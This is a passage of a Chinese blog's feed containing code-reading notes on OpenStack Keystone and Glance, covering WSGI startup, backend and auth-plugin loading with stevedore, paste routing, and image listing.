&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;、管理用户及其权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    不同用户拥有不同权限。这里的权限不仅仅指的是用户对于某项资源的权限，也包括对某项用户的权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;、维护 OpenStack Services 的 Endpoint&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Endpoint 是一个网络上可访问的地址，通常是一个 URL。Service 通过 Endpoint 暴露自己的 API，Keystone 负责管理和维护每个 Service 的 Endpoint。（关键）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3.&lt;/span&gt;Authentication（认证）和 Authorization（鉴权）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;更多基本概念的介绍可以查看&lt;a href=&quot;https://blog.csdn.net/zhongbeida_xue/article/details/78654676&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;OpenStack keystone详解及调优&lt;/a&gt;和&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzIwMTM5MjUwMg==&amp;mid=2653587894&amp;idx=1&amp;sn=877a9cb2c23f242e45e7c113f2d2440f&amp;chksm=8d3081afba4708b9295debc08ac8159927733a1429a5f488ce136370984be15e6039b3496b46&amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;理解 Keystone 核心概念 - 每天5分钟玩转 OpenStack(18)&lt;/a&gt;，&lt;a href=&quot;https://www.cnblogs.com/linhaifeng/p/6248086.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;推荐看&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="keystone" scheme="https://myndtt.github.io/tags/keystone/"/>
    
      <category term="openstack" scheme="https://myndtt.github.io/tags/openstack/"/>
    
  </entry>
  
  <entry>
    <title>Openstack之keystone源代码简读二</title>
    <link href="https://myndtt.github.io/2019/11/21/Openstack%E4%B9%8Bkeystone%E6%BA%90%E4%BB%A3%E7%A0%81%E7%AE%80%E8%AF%BB%E4%BA%8C/"/>
    <id>https://myndtt.github.io/2019/11/21/Openstack之keystone源代码简读二/</id>
    <published>2019-11-21T09:37:48.000Z</published>
    <updated>2019-11-21T09:47:02.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>上次谈到<code>initialize_admin_application</code> ，今天来看看。</p><h2 id="二、APP的启动"><a href="#二、APP的启动" class="headerlink" title="二、APP的启动"></a>二、APP的启动</h2><p><code>wsgi.py</code>文件的有两个初始化函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize_admin_application</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> initialize_application(name=<span class="string">'admin'</span>,</span><br><span class="line">                                  config_files=_get_config_files())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize_public_application</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> initialize_application(name=<span class="string">'main'</span>,</span><br><span class="line">                                  config_files=_get_config_files())</span><br></pre></td></tr></table></figure><p>都指向了<code>initialize_application</code>，进入得：</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize_application</span><span class="params">(name,</span></span></span><br><span class="line"><span class="function"><span class="params">                           post_log_configured_function=lambda: None,</span></span></span><br><span class="line"><span class="function"><span class="params">                           config_files=None)</span>:</span></span><br><span class="line">    possible_topdir = os.path.normpath(os.path.join(</span><br><span class="line">                                       os.path.abspath(__file__),</span><br><span class="line">                                       os.pardir,</span><br><span class="line">                                       os.pardir,</span><br><span class="line">                                       os.pardir))</span><br><span class="line"></span><br><span class="line">    dev_conf = os.path.join(possible_topdir,</span><br><span class="line">                            <span class="string">'etc'</span>,</span><br><span class="line">                            <span class="string">'keystone.conf'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> config_files:</span><br><span class="line">        config_files = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(dev_conf):</span><br><span class="line">            config_files = [dev_conf]<span class="comment">#去找到可能存在的配置文件</span></span><br><span class="line"></span><br><span class="line">    common.configure(config_files=config_files)<span class="comment">#初始化配置文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Log the options used when starting if we're in debug mode...</span></span><br><span class="line">    <span class="keyword">if</span> CONF.debug:</span><br><span class="line">        CONF.log_opt_values(log.getLogger(CONF.prog), log.DEBUG)</span><br><span class="line"></span><br><span class="line">    post_log_configured_function()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadapp</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> keystone_service.loadapp(</span><br><span class="line">            <span class="string">'config:%s'</span> % find_paste_config(), name)</span><br><span class="line"></span><br><span class="line">    _unused, application = common.setup_backends(</span><br><span class="line">        startup_application_fn=loadapp)<span class="comment">#回调</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># setup OSprofiler notifier and enable the profiling if that is configured</span></span><br><span class="line">    <span class="comment"># in Keystone configuration file.</span></span><br><span class="line">    profiler.setup(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> application</span><br></pre></td></tr></table></figure><p>跟进<code>common.configure</code>，其实这代码有点像上篇的那一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span><span class="params">(version=None, config_files=None,</span></span></span><br><span class="line"><span class="function"><span class="params">              pre_setup_logging_fn=lambda: None)</span>:</span></span><br><span class="line">    keystone.conf.configure()</span><br><span class="line">    sql.initialize()</span><br><span class="line">    keystone.conf.set_config_defaults()</span><br><span class="line"></span><br><span class="line">    CONF(project=<span class="string">'keystone'</span>, version=version,</span><br><span class="line">         default_config_files=config_files)</span><br><span class="line"></span><br><span class="line">    pre_setup_logging_fn()</span><br><span class="line">    keystone.conf.setup_logging()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.insecure_debug:</span><br><span class="line">        LOG.warning(</span><br><span class="line">            <span class="string">'insecure_debug is enabled so responses may include sensitive '</span></span><br><span class="line">            <span class="string">'information.'</span>)</span><br></pre></td></tr></table></figure><p>重点看看<code>common.setup_backends</code>，跟进得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_backends</span><span class="params">(load_extra_backends_fn=lambda: &#123;&#125;,</span></span></span><br><span class="line"><span class="function"><span class="params">                   startup_application_fn=lambda: None)</span>:</span></span><br><span class="line">    drivers = backends.load_backends()</span><br><span class="line">    drivers.update(load_extra_backends_fn())</span><br><span class="line">    res = startup_application_fn()<span class="comment">#传进去的回调函数</span></span><br><span class="line">    <span class="keyword">return</span> drivers, res</span><br></pre></td></tr></table></figure><p>进入<code>backends.load_backends</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_backends</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Configure and build the cache</span></span><br><span class="line">    cache.configure_cache()</span><br><span class="line">    cache.configure_cache(region=catalog.COMPUTED_CATALOG_REGION)</span><br><span class="line">    cache.configure_cache(region=assignment.COMPUTED_ASSIGNMENTS_REGION)</span><br><span class="line">    cache.configure_cache(region=revoke.REVOKE_REGION)</span><br><span class="line">    cache.configure_cache(region=token.provider.TOKENS_REGION)</span><br><span class="line">    cache.configure_cache(region=identity.ID_MAPPING_REGION)</span><br><span class="line">    cache.configure_invalidation_region()</span><br><span class="line"></span><br><span class="line">    managers = [application_credential.Manager, assignment.Manager,</span><br><span class="line">                catalog.Manager, credential.Manager,</span><br><span class="line">                credential.provider.Manager, resource.DomainConfigManager,</span><br><span class="line">                endpoint_policy.Manager, federation.Manager,</span><br><span class="line">                identity.generator.Manager, identity.MappingManager,</span><br><span class="line">                identity.Manager, identity.ShadowUsersManager,</span><br><span class="line">                limit.Manager, oauth1.Manager, policy.Manager,</span><br><span class="line">                resource.Manager, revoke.Manager, assignment.RoleManager,</span><br><span class="line">                trust.Manager, token.provider.Manager,</span><br><span class="line">                persistence.PersistenceManager]</span><br><span class="line"></span><br><span class="line">    drivers = &#123;d._provides_api: d() <span class="keyword">for</span> d <span class="keyword">in</span> managers&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(morgan): lock the APIs, these should only ever be instantiated</span></span><br><span class="line">    <span class="comment"># before running keystone.</span></span><br><span class="line">    provider_api.ProviderAPIs.lock_provider_registry()<span class="comment">#drivers字典，里面存放的是一些列manager，每一个都对应keystone目录下对应模块core.py中的Manger对象，这里只负责实例化对象，所以对这些对象加锁。</span></span><br><span class="line"></span><br><span class="line">    auth.core.load_auth_methods()<span class="comment">#进入认证,并加载</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> drivers</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_auth_method</span><span class="params">(method)</span>:</span></span><br><span class="line">    plugin_name = CONF.auth.get(method) <span class="keyword">or</span> <span class="string">'default'</span></span><br><span class="line">    namespace = <span class="string">'keystone.auth.%s'</span> % method</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver_manager = stevedore.DriverManager(namespace, plugin_name,</span><br><span class="line">                                                 invoke_on_load=<span class="literal">True</span>)<span class="comment">#</span></span><br><span class="line">        <span class="keyword">return</span> driver_manager.driver</span><br><span class="line">    <span class="keyword">except</span> RuntimeError:</span><br><span class="line">        LOG.debug(<span class="string">'Failed to load the %s driver (%s) using stevedore, will '</span></span><br><span class="line">                  <span class="string">'attempt to load using import_object instead.'</span>,</span><br><span class="line">                  method, plugin_name)</span><br><span class="line"></span><br><span class="line">    driver = importutils.import_object(plugin_name)</span><br><span class="line"></span><br><span class="line">    msg = (_(</span><br><span class="line">        <span class="string">'Direct import of auth plugin %(name)r is deprecated as of Liberty in '</span></span><br><span class="line">        <span class="string">'favor of its entrypoint from %(namespace)r and may be removed in '</span></span><br><span class="line">        <span class="string">'N.'</span>) %</span><br><span class="line">        &#123;<span class="string">'name'</span>: plugin_name, <span class="string">'namespace'</span>: namespace&#125;)</span><br><span class="line">    versionutils.report_deprecated_feature(LOG, msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> driver</span><br></pre></td></tr></table></figure><p>主要用到stevedore这里加载插件的方法。具体stevedore用法可以看官方文档，或者<a href="https://my.oschina.net/hochikong/blog/477665" target="_blank" rel="noopener">这篇</a>,<a href="https://blog.csdn.net/gqtcgq/article/details/49620279" target="_blank" rel="noopener">这篇</a>,至此，该看的差不多看了。对应的认证路由是在<code>auth</code>文件夹下的<code>routers.py</code>文件下，而对应的认证方法写在<code>controllers.py</code>文件夹下。</p><p>对应endpoint的理解<a href="https://www.cnblogs.com/eric-nirnava/p/endpoint.html" target="_blank" rel="noopener">可看</a></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>keystone整体流程大致如此。总结可以看着位<a href="https://blog.csdn.net/dylloveyou/article/details/80329732" target="_blank" rel="noopener">前辈的</a>，画的图也有助于理解。</p><p><img src="https://myndtt.github.io/images/66.png" alt="3"></p><p>OpenStack系统要求的REST风格,这一点很标准。</p><p>目前来看，keystone的功能实现，主要涉及额外的公共python库有</p><ol><li><p>OSLO oslo_config  oslo_cache</p></li><li><p>stevedore (动态加载代码)</p></li></ol><p>openstack的学习其实就是对python的各类库的学习！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;上次谈到&lt;code&gt;initialize_admin_application&lt;/code&gt; ，今天来看看。&lt;/p&gt;
&lt;h2 id=&quot;二、APP的启动&quot;&gt;&lt;a href=&quot;#二、APP的启动&quot; class=&quot;headerlink&quot; title=&quot;二、APP的启动&quot;&gt;&lt;/a&gt;二、APP的启动&lt;/h2&gt;&lt;p&gt;&lt;code&gt;wsgi.py&lt;/code&gt;文件的有两个初始化函数&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;initialize_admin_application&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; initialize_application(name=&lt;span class=&quot;string&quot;&gt;&#39;admin&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                  config_files=_get_config_files())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;initialize_public_application&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; initialize_application(name=&lt;span class=&quot;string&quot;&gt;&#39;main&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                  config_files=_get_config_files())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;都指向了&lt;code&gt;initialize_application&lt;/code&gt;，进入得：&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="keystone" scheme="https://myndtt.github.io/tags/keystone/"/>
    
      <category term="openstack" scheme="https://myndtt.github.io/tags/openstack/"/>
    
  </entry>
  
  <entry>
    <title>Openstack之Glance源代码简读一</title>
    <link href="https://myndtt.github.io/2019/09/22/Openstack%E4%B9%8BGlance%E6%BA%90%E4%BB%A3%E7%A0%81%E7%AE%80%E8%AF%BB%E4%B8%80/"/>
    <id>https://myndtt.github.io/2019/09/22/Openstack之Glance源代码简读一/</id>
    <published>2019-09-22T05:13:59.000Z</published>
    <updated>2019-09-22T05:30:29.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>学习openstack,对其大体框架已经熟悉，学习其内部基本原理，聊以记录。</p><p>作为 OpenStack 的基础支持服务，Keystone 做下面这几件事情：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenStack Glance是一种提供发现，注册，和下载的镜像服务。OpenStack Glance是一个提供虚拟机镜像的集中式仓库。通过Glance的RESTful API，可以查询镜像元数据下载镜像。虚拟机的镜像可以很方便的存储在各种地方，从简单的文件系统到对象存储系统(如OpenStack Swift项目)。</span><br></pre></td></tr></table></figure><p>更多基本概念的介绍可以查看<a href="https://blog.csdn.net/dylloveyou/article/details/80530838" target="_blank" rel="noopener">一文读懂OpenStack Glance是什么 </a>。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>我的机器是ubuntu 18，可以按照<a href="https://docs.openstack.org/glance/latest/install/install-ubuntu.html" target="_blank" rel="noopener">官网</a>安装。</p><a id="more"></a><h2 id="三、分析glance-APi"><a href="#三、分析glance-APi" class="headerlink" title="三、分析glance-APi"></a>三、分析glance-APi</h2><p>一般来说，你这样安装<code>apt install glance</code>的话，glance会在<code>/usr/lib/python2.7/dist-packages/glance</code>下。查看 /usr/bin的关于glance的指令,有不少，目前先看 <code>glance-api</code>,与<code>keystone-admin</code>差不多，最初一点比较明显的是keystone是由apache启动，而<code>glance-api</code>则直接脚本启动：</p><p><img src="https://myndtt.github.io/images/62.jpg" alt="1"></p><p>进入cmd目录下的<code>api.py</code>，启动服务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()</span><br><span class="line">        config.set_config_defaults()</span><br><span class="line">        wsgi.set_eventlet_hub()<span class="comment">#协程</span></span><br><span class="line">        logging.setup(CONF, <span class="string">'glance'</span>)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">            osprofiler.initializer.init_from_conf(</span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">"glance"</span>,</span><br><span class="line">                service=<span class="string">"api"</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        server = wsgi.Server(initialize_glance_store=<span class="literal">True</span>)</span><br><span class="line">        server.start(config.load_paste_app(<span class="string">'glance-api'</span>), default_port=<span class="number">9292</span>)</span><br><span class="line">        server.wait()</span><br><span class="line">    <span class="keyword">except</span> KNOWN_EXCEPTIONS <span class="keyword">as</span> e:</span><br><span class="line">        fail(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>进入<code>cli.py</code>文件的<code>main</code>函数，关注<code>server.start(config.load_paste_app(&#39;glance-api&#39;), default_port=9292)</code></p><p>它的功能是根据paste配置文件建立并返回一个WSGI应用程序。glance-api的paste配置文件是源代码中的<code>/etc/glance-api-paste.ini</code>，并根据传入的参数<code>glance-api</code>来找到对应的配置,然而并没有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[composite:rootapp]</span><br><span class="line">paste.composite_factory = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v1: apiv1app</span><br><span class="line">/v2: apiv2app</span><br></pre></td></tr></table></figure><p>但找到<code>composite:rootapp]</code>request进来后第一个通过的Section，表示需要将一个HTTP URL Request调度到一个或多种Application上。来到对应函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root_app_factory</span><span class="params">(loader, global_conf, **local_conf)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> CONF.enable_v1_api <span class="keyword">and</span> <span class="string">'/v1'</span> <span class="keyword">in</span> local_conf:</span><br><span class="line">        <span class="keyword">del</span> local_conf[<span class="string">'/v1'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> CONF.enable_v2_api <span class="keyword">and</span> <span class="string">'/v2'</span> <span class="keyword">in</span> local_conf:</span><br><span class="line">        <span class="keyword">del</span> local_conf[<span class="string">'/v2'</span>]</span><br><span class="line">    <span class="keyword">return</span> paste.urlmap.urlmap_factory(loader, global_conf, **local_conf)</span><br></pre></td></tr></table></figure><p>接下来就是进入api文件夹V1,V2目录的<code>router.py</code>寻找对应路由。<code>glance-registry</code>的启动也大概是这样。不过不同的是glance-registry处理的是与镜像元数据相关的RESTful请求。Glance-api接收到用户的RESTful请求后，如果该请求与元数据相关，则将其转发给glance-registry服务。glance-registry会解析请求的内容，并与数据库进行交互，存取或更新镜像的元数据，这里的元数据是指保存在数据库中的关于镜像的一些信息，Glance的DB模块存储的仅仅是镜像的元数据。</p><h2 id="四、实践几个问题"><a href="#四、实践几个问题" class="headerlink" title="四、实践几个问题"></a>四、实践几个问题</h2><h3 id="1-列举镜像过程"><a href="#1-列举镜像过程" class="headerlink" title="1. 列举镜像过程"></a>1. 列举镜像过程</h3><p><img src="https://myndtt.github.io/images/63.jpg" alt="2"></p><p><code>image_repo = self.gateway.get_repo(req.context)</code>进入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageRepo</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, context, db_api)</span>:</span></span><br><span class="line">        self.context = context</span><br><span class="line">        self.db_api = db_api</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, image_id)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db_api_image = dict(self.db_api.image_get(self.context, image_id))</span><br><span class="line">            <span class="keyword">if</span> db_api_image[<span class="string">'deleted'</span>]:</span><br><span class="line">                <span class="keyword">raise</span> exception.ImageNotFound()</span><br><span class="line">        <span class="keyword">except</span> (exception.ImageNotFound, exception.Forbidden):</span><br><span class="line">            msg = _(<span class="string">"No image found with ID %s"</span>) % image_id</span><br><span class="line">            <span class="keyword">raise</span> exception.ImageNotFound(msg)</span><br><span class="line">        tags = self.db_api.image_tag_get_all(self.context, image_id)</span><br><span class="line">        image = self._format_image_from_db(db_api_image, tags)</span><br><span class="line">        <span class="keyword">return</span> ImageProxy(image, self.context, self.db_api)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(self, marker=None, limit=None, sort_key=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             sort_dir=None, filters=None, member_status=<span class="string">'accepted'</span>)</span>:</span></span><br><span class="line">        sort_key = [<span class="string">'created_at'</span>] <span class="keyword">if</span> <span class="keyword">not</span> sort_key <span class="keyword">else</span> sort_key</span><br><span class="line">        sort_dir = [<span class="string">'desc'</span>] <span class="keyword">if</span> <span class="keyword">not</span> sort_dir <span class="keyword">else</span> sort_dir</span><br><span class="line">        db_api_images = self.db_api.image_get_all(</span><br><span class="line">            self.context, filters=filters, marker=marker, limit=limit,</span><br><span class="line">            sort_key=sort_key, sort_dir=sort_dir,</span><br><span class="line">            member_status=member_status, return_tag=<span class="literal">True</span>)</span><br><span class="line">        images = []</span><br><span class="line">        <span class="keyword">for</span> db_api_image <span class="keyword">in</span> db_api_images:</span><br><span class="line">            db_image = dict(db_api_image)</span><br><span class="line">            image = self._format_image_from_db(db_image, db_image[<span class="string">'tags'</span>])</span><br><span class="line">            images.append(image)</span><br><span class="line">        <span class="keyword">return</span> images</span><br></pre></td></tr></table></figure><p>从数据库里面查取就好了。取出后还需要层层验证。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 